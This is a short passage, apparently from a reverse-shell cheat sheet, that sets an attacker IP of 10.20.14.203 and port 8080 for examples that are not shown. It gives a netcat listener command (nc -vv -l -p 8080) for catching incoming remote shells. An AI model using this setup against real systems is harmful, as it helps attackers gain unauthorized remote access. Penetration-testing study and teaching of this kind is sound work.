...
```
The following examples assume the hacker IP is 10.20.14.203 and use port 8080 for the connection.
Therefore in all of these cases you need to listen for port 8080 using the foolowing command
nc -vv -l -p 8080
